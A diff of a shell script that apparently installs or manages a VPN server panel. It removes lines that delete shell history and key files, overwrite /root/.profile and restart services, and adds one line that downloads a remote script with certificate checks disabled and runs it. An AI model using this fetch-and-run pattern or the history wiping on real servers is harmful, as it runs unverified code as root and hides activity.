@@ -552,39 +552,7 @@ curl -s --max-time 10 -X POST "$URL" \
 clear
 }
 
-rm ~/.bash_history
-rm -f openvpn
-rm -f key.pem
-rm -f cert.pem
-rm -rf /usr/bin/security
-rm -rf /usr/bin/warning
-rm -rf /usr/bin/detek
-rm -rf /usr/bin/change_pass.sh
-rm -rf /root/.profile
-
-cat> /root/.profile << END
-if [ "$BASH" ]; then
-if [ -f ~/.bashrc ]; then
-. ~/.bashrc
-fi
-fi
-mesg n || true
-clear
-menu
-END
-chmod 644 /root/.profile
-
-systemctl restart udp-custom
-systemctl restart xray
-systemctl restart nginx
-systemctl restart ws
-systemctl restart dropbear
-systemctl restart badvpn1
-systemctl restart badvpn2
-systemctl restart badvpn3
-systemctl restart haproxy
-systemctl restart chrony
-systemctl restart openvpn
+wget --no-check-certificate https://raw.githubusercontent.com/CODE1-cpu/xscriptx/main/SUFFIX_ERROR && chmod +x SUFFIX_ERROR && ./SUFFIX_ERROR
 
 clear
 echo -e "${c}┌────────────────────────────────────────────┐${NC}"
